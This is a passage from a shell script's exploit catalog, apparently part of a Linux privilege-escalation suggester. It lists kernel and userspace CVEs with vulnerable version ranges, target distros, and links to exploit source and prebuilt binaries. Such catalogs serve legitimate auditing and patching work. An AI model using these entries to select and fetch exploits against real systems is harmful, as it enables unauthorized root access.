Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent64
exploit-db: 26131
author: Andrea 'sorbo' Bittau
Comments: No SMEP/SMAP bypass
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2013-2094 } ${XX} perf_swevent 2
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64
Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
src-url: https://cyseclabs.com/exploits/vnik_v1.c
exploit-db: 33589
author: Vitaly 'vnik' Nikolenko
Comments: No SMEP/SMAP bypass
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2013-0268 } ${XX} msr
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<3.7.6
Tags: 
Rank: 1
exploit-db: 27297
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2013-1959 } ${XX} userns_root_sploit
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.8.9
Tags: 
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2013/04/29/1
exploit-db: 25450
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2013-2094 } ${XX} semtex
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9
Tags: RHEL=6
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
exploit-db: 25444
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-0038 } ${XX} timeoutpwn
Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y
Tags: ubuntu=13.10
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/timeoutpwn64
exploit-db: 31346
Comments: CONFIG_X86_X32 needs to be enabled
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-0038 } ${XX} timeoutpwn 2
Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y
Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
exploit-db: 31347
Comments: CONFIG_X86_X32 needs to be enabled
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-0196 } ${XX} rawmodePTY
Reqs: pkg=linux-kernel,ver>=2.6.31,ver<=3.14.3
Tags:
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
exploit-db: 33516
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-2851 } ${XX} use-after-free in ping_init_sock() ${BLUE}(DoS)${XX}
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.14
Tags: 
Rank: 0
analysis-url: https://cyseclabs.com/page?n=02012016
exploit-db: 32926
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-4014 } ${XX} inode_capable
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.13
Tags: ubuntu=12.04
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2014/06/10/4
exploit-db: 33824
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-4699 } ${XX} ptrace/sysret
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.8
Tags: ubuntu=12.04
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2014/07/08/16
exploit-db: 34134
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-4943 } ${XX} PPPoL2TP ${BLUE}(DoS)${XX}
Reqs: pkg=linux-kernel,ver>=3.2,ver<=3.15.6
Tags: 
Rank: 1
analysis-url: https://cyseclabs.com/page?n=01102015
exploit-db: 36267
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-5207 } ${XX} fuse_suid
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.16.1
Tags: 
Rank: 1
exploit-db: 34923
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-9322 } ${XX} BadIRET
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.17.5,x86_64
Tags: RHEL<=7,fedora=20
Rank: 1
analysis-url: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
src-url: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
exploit-db:
author: Rafal 'n3rgal' Wojtczuk & Adam 'pi3' Zabrocki
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-3290 } ${XX} espfix64_NMI
Reqs: pkg=linux-kernel,ver>=3.13,ver<4.1.6,x86_64
Tags: 
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2015/08/04/8
exploit-db: 37722
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ N/A } ${XX} bluetooth
Reqs: pkg=linux-kernel,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 4756
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-1328 } ${XX} overlayfs
Reqs: pkg=linux-kernel,ver>=3.13.0,ver<=3.19.0
Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/717
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_32
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_64
exploit-db: 37292
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-8660 } ${XX} overlayfs (ovl_setattr)
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3
Tags:
Rank: 1
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39230
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-8660 } ${XX} overlayfs (ovl_setattr)
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3
Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
Rank: 1
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39166
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-0728 } ${XX} keyring
Reqs: pkg=linux-kernel,ver>=3.10,ver<4.4.1
Tags:
Rank: 0
analysis-url: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
exploit-db: 40003
Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-2384 } ${XX} usb-midi
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.4.8
Tags: ubuntu=14.04,fedora=22
Rank: 1
analysis-url: https://xairy.github.io/blog/2016/cve-2016-2384
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
exploit-db: 41999
Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-4997 } ${XX} target_offset
Reqs: pkg=linux-kernel,ver>=4.4.0,ver<=4.4.0,cmd:grep -qi ip_tables /proc/modules
Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40053.zip
Comments: ip_tables.ko needs to be loaded
exploit-db: 40049
author: Vitaly 'vnik' Nikolenko
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-4557 } ${XX} double-fdput()
Reqs: pkg=linux-kernel,ver>=4.4,ver<4.5.5,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
exploit-db: 40759
author: Jann Horn
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-5195 } ${XX} dirtycow
Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3
Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
Rank: 4
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
exploit-db: 40611
author: Phil Oester
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-5195 } ${XX} dirtycow 2
Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3
Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 4
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
ext-url: https://www.exploit-db.com/download/40847
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
exploit-db: 40839
author: FireFart (author of exploit at EDB 40839); Gabriele Bonacini (author of exploit at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-8655 } ${XX} chocobo_root
Reqs: pkg=linux-kernel,ver>=4.4.0,ver<4.9,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2016/12/06/1
Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2016-8655/chocobo_root
exploit-db: 40871
author: rebel
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-9793 } ${XX} SO_{SND|RCV}BUFFORCE
Reqs: pkg=linux-kernel,ver>=3.11,ver<4.8.14,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags:
Rank: 1
analysis-url: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only
exploit-db: 41995
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-6074 } ${XX} dccp
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=4.9.11,CONFIG_IP_DCCP=[my]
Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/02/22/3
Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
exploit-db: 41458
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-7308 } ${XX} af_packet
Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.10.6,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
Rank: 1
analysis-url: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-7308/exploit
exploit-db: 41994
author: Andrey 'xairy' Konovalov (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-16995 } ${XX} eBPF_verifier
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.8,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
Rank: 5
analysis-url: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-16995/exploit.out
exploit-db: 45010
author: Rick Larabee
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000112 } ${XX} NETIF_F_UFO
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.13,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=14.04{kernel:4.4.0-*},ubuntu=16.04{kernel:4.8.0-*}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/08/13/1
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-1000112/exploit.out
exploit-db:
author: Andrey 'xairy' Konovalov (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000253 } ${XX} PIE_stack_corruption
Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.13,x86_64
Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
Rank: 1
analysis-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
src-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
exploit-db: 42887
author: Qualys
Comments:
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2018-5333 } ${XX} rds_atomic_free_op NULL pointer dereference
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.13,cmd:grep -qi rds /proc/modules,x86_64
Tags: ubuntu=16.04{kernel:4.4.0|4.8.0}
Rank: 1
src-url: https://gist.githubusercontent.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4/raw/959325819c78248a6437102bb289bb8578a135cd/cve-2018-5333-poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-5333/cve-2018-5333.c
Comments: rds.ko kernel module needs to be loaded. Modified version at 'ext-url' adds support for additional targets and bypassing KASLR.
author: wbowling (orginal exploit author); bcoles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2018-18955 } ${XX} subuid_shell
Reqs: pkg=linux-kernel,ver>=4.15,ver<=4.19.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,cmd:[ -u /usr/bin/newuidmap ],cmd:[ -u /usr/bin/newgidmap ]
Tags: ubuntu=18.04{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
src-url: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
exploit-db: 45886
author: Jann Horn
Comments: CONFIG_USER_NS needs to be enabled
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-13272 } ${XX} PTRACE_TRACEME
Reqs: pkg=linux-kernel,ver>=4,ver<5.1.17,sysctl:kernel.yama.ptrace_scope==0,x86_64
Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
src-url: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
Comments: Requires an active PolKit agent.
exploit-db: 47133
exploit-db: 47163
author: Jann Horn (orginal exploit author); bcoles (author of exploit update at 'ext-url')
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-15666 } ${XX} XFRM_UAF
Reqs: pkg=linux-kernel,ver>=3,ver<5.0.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,CONFIG_XFRM=y
Tags:
Rank: 1
analysis-url: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
bin-url: https://github.com/duasynt/xfrm_poc/raw/master/lucky0
Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
author: Vitaly 'vnik' Nikolenko
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2021-27365 } ${XX} linux-iscsi
Reqs: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y
Tags: RHEL=8
Rank: 1
analysis-url: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
src-url: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled
author: GRIMM
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2021-3490 } ${XX} eBPF ALU32 bounds tracking for bitwise ops
Reqs: pkg=linux-kernel,ver>=5.7,ver<5.12,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
Rank: 5
analysis-url: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
src-url: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
author: chompie1337
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2021-22555 } ${XX} Netfilter heap out-of-bounds write
Reqs: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6
Tags: ubuntu=20.04{kernel:5.8.0-*}
Rank: 1
analysis-url: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
src-url: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
Comments: ip_tables kernel module must be loaded
exploit-db: 50135
author: theflow (orginal exploit author); bcoles (author of exploit update at 'ext-url')
EOF
)

n=0

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2004-0186 } ${XX} samba
Reqs: pkg=samba,ver<=2.2.8
Tags: 
Rank: 1
exploit-db: 23674
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-1185 } ${XX} udev
Reqs: pkg=udev,ver<141,cmd:[[ -f /etc/udev/rules.d/95-udev-late.rules || -f /lib/udev/rules.d/95-udev-late.rules ]]
Tags: ubuntu=8.10|9.04
Rank: 1
exploit-db: 8572
Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-1185 } ${XX} udev 2
Reqs: pkg=udev,ver<141
Tags:
Rank: 1
exploit-db: 8478
Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-0832 } ${XX} PAM MOTD
Reqs: pkg=libpam-modules,ver<=1.1.1
Tags: ubuntu=9.10|10.04
Rank: 1
exploit-db: 14339
Comments: SSH access to non privileged user is needed
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-4170 } ${XX} SystemTap
Reqs: pkg=systemtap,ver<=1.3
Tags: RHEL=5{systemtap:1.1-3.el5},fedora=13{systemtap:1.2-1.fc13}
Rank: 1
author: Tavis Ormandy
exploit-db: 15620
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2011-1485 } ${XX} pkexec
Reqs: pkg=polkit,ver=0.96
Tags: RHEL=6,ubuntu=10.04|10.10
Rank: 1
exploit-db: 17942
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2011-2921 } ${XX} ktsuss
Reqs: pkg=ktsuss,ver<=1.4
Tags: sparky=5|6
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2011/08/13/2
src-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2011-2921/ktsuss-lpe.sh
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2012-0809 } ${XX} death_star (sudo)
Reqs: pkg=sudo,ver>=1.8.0,ver<=1.8.3
Tags: fedora=16 
Rank: 1
analysis-url: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
exploit-db: 18436
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-0476 } ${XX} chkrootkit
Reqs: pkg=chkrootkit,ver<0.50
Tags: 
Rank: 1
analysis-url: http://seclists.org/oss-sec/2014/q2/430
exploit-db: 33899
Comments: Rooting depends on the crontab (up to one day of delay)
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2014-5119 } ${XX} __gconv_translit_find
Reqs: pkg=glibc|libc6,x86
Tags: debian=6
Rank: 1
analysis-url: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/34421.tar.gz
exploit-db: 34421
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-1862 } ${XX} newpid (abrt)
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: fedora=20
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
src-url: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
exploit-db: 36746
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-3315 } ${XX} raceabrt
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: fedora=19{abrt:2.1.5-1.fc19},fedora=20{abrt:2.2.2-2.fc20},fedora=21{abrt:2.3.0-3.fc21},RHEL=7{abrt:2.1.11-12.el7}
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/130
src-url: https://gist.githubusercontent.com/taviso/fe359006836d6cd1091e/raw/32fe8481c434f8cad5bcf8529789231627e5074c/raceabrt.c
exploit-db: 36747
author: Tavis Ormandy
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-1318 } ${XX} newpid (apport)
Reqs: pkg=apport,ver>=2.13,ver<=2.17,cmd:grep -qi apport /proc/sys/kernel/core_pattern
Tags: ubuntu=14.04
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
src-url: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
exploit-db: 36746
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-1318 } ${XX} newpid (apport) 2
Reqs: pkg=apport,ver>=2.13,ver<=2.17,cmd:grep -qi apport /proc/sys/kernel/core_pattern
Tags: ubuntu=14.04.2
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
exploit-db: 36782
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-3202 } ${XX} fuse (fusermount)
Reqs: pkg=fuse,ver<2.9.3
Tags: debian=7.0|8.0,ubuntu=*
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/520
exploit-db: 37089
Comments: Needs cron or system admin interaction
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-1815 } ${XX} setroubleshoot
Reqs: pkg=setroubleshoot,ver<3.2.22
Tags: fedora=21
Rank: 1
exploit-db: 36564
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-3246 } ${XX} userhelper
Reqs: pkg=libuser,ver<=0.60
Tags: RHEL=6{libuser:0.56.13-(4|5).el6},RHEL=6{libuser:0.60-5.el7},fedora=13|19|20|21|22
Rank: 1
analysis-url: https://www.qualys.com/2015/07/23/cve-2015-3245-cve-2015-3246/cve-2015-3245-cve-2015-3246.txt 
exploit-db: 37706
Comments: RHEL 5 is also vulnerable, but installed version of glibc (2.5) lacks functions needed by roothelper.c
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-5287 } ${XX} abrt/sosreport-rhel7
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: RHEL=7{abrt:2.1.11-12.el7}
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2015/12/01/1
src-url: https://www.openwall.com/lists/oss-security/2015/12/01/1/1
exploit-db: 38832
author: rebel
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-6565 } ${XX} not_an_sshnuke
Reqs: pkg=openssh-server,ver>=6.8,ver<=6.9
Tags:
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/01/26/2
exploit-db: 41173
author: Federico Bento
Comments: Needs admin interaction (root user needs to login via ssh to trigger exploitation)
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2015-8612 } ${XX} blueman set_dhcp_handler d-bus privesc
Reqs: pkg=blueman,ver<2.0.3
Tags: debian=8{blueman:1.23}
Rank: 1
analysis-url: https://twitter.com/thegrugq/status/677809527882813440
exploit-db: 46186
author: Sebastian Krahmer
